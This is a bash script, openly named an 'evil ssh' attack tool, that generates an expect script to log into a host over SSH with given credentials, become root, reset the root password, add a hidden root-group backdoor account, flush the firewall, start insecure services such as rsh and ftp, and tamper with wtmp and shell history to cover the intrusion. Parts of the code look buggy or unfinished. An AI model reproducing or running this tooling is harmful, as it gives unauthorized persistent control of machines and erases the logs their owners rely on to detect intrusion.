#!/usr/bin/env bash
#evil ssh; ssh attack tool
# TO DO
# remove login history when the "last" command is typed in

if [ "$1" = "-h" -o "$1" = "--help" ]; then
	echo "Usage: $0 [user@host] [password] [options]"
	exit 0
fi

#variables - can be changed to meet different needs
expectFile="connect.exp"
serviceStop="iptables"
serviceStart="xinetd inetd ssh sshd cron crond anacron cups portmap nfs smb smbd samba rsync rsh rlogin ftp"
newUser="sysd"
newRootPass="Password!"
newPass="Password!"
alterLastHistory="yes"
port=22

if [ $# -gt 0 ]; then
	firstArg=$1
	pass=$2
	user=`echo $firstArg | /usr/bin/env awk -F"@" '{print $1}'`
else
	echo "Values can also be given as command line arguments."
	read -p "Enter host: " host
	read -p "Enter username: " user
	read -p "Enter password: " pass
	read -p "Enter port: " port
	if [ "port" == "" ]; then
		port=22
	fi
	firstArg="$user@$host"
fi

# echo "command would be ssh $firstArg -p $port"
if [ "$user" == "root" ]; then
	firstCmd="su"
else
	firstCmd="sudo su"
fi

#switch to sh instead of bash or whatever default is
echo "#!/usr/bin/expect" > $expectFile #write shebang to file

if [ "$alterLastHistory" == "yes" ]; then #if want to alter last history to cover tracks of logging in, write this to file
	/bin/cat <<SCP >> $expectFile
spawn scp -P $port $firstArg:/var/log/wtmp ./evil_ssh_wtmp_backup
expect {
-re ".*Are.*.*yes.*no.*" {
send "yes\n"
exp_continue
}
expect "*assword*"
send "$pass\r"
sleep 1
spawn scp -P $port ./evil_ssh_wtmp_backup $firstArg:/var/log/wtmp.bak
expect {
-re ".*Are.*.*yes.*no.*" {
send "yes\n"
exp_continue
}
expect "*assword*"
send "$pass\r"
sleep 1
SCP
fi

/bin/cat <<HEAD >> $expectFile
spawn ssh -p $port $firstArg
expect {
-re ".*Are.*.*yes.*no.*" {
send "yes\n"
exp_continue
}
#use correct prompt
set prompt ":|#|\\\$"
interact -o -nobuffer -re \$prompt return
send "$pass\r"
interact -o -nobuffer -re \$prompt return
send "history -d \`history | wc -l\`; sh" #make sure we don't leave a trail
HEAD

if [ "$user" != "root" ]; then #if not root, sudo su to root and send password to be successful
	echo "interact -o -nobuffer -re \$prompt return" >> $expectFile
	echo "send \"history -d \`history | wc -l\`; sudo su\"" >> $expectFile
	echo "interact -o -nobuffer -re \"*assword*\" return" >> $expectFile
	echo "send \"$pass\r\"" >> $expectFile
	echo "exp_continue" >> $expectFile #not sure if i need this line or not. just in case no pw is needed
fi

/bin/cat<<MORE >> $expectFile
interact -o -nobuffer -re \$prompt return
send "echo -e \"$newRootPass\n$newRootPass\" | passwd\r" #change root password
interact -o -nobuffer -re \$prompt return
send "useradd -g root -G sudo -o -u 250 $newUser" #add 'backdoor' user
interact -o -nobuffer -re \$prompt return
send "/usr/bin/env iptables -F || ipfw flush \r"
MORE

#start certain services
for service in $serviceStart; do
	echo "interact -o -nobuffer -re \$prompt return" >> $expectFile
	echo "send\"/usr/bin/env service $service start\r\" " >> $expectFile
done

#stop certain services
for service in $serviceStop; do
	echo "interact -o -nobuffer -re \$prompt return" >> $expectFile
	echo "send\"/usr/bin/env service $service stop\r\" " >> $expectFile
done

if [ "$alterLastHistory" == "yes" ]; then
	echo "interact -o -nobuffer -re \$prompt return" >> $expectFile
	echo "send \"mv /var/log/wtmp.bak /var/log/wtmp\" #replace the wtmp file to cover our tracks" >> $expectFile
fi

/bin/cat <<BOTTOM >> $expectFile
interact -o -nobuffer -re \$prompt return
send "exit\r" #exit the sh and go back to original shell
interact -o -nobuffer -re \$prompt return
send "history -d \`history | wc -l\`; exit\r" #exit ssh
interact
BOTTOM

echo "Attempting login..."
# /usr/bin/expect myfile.exp
echo "Completed."

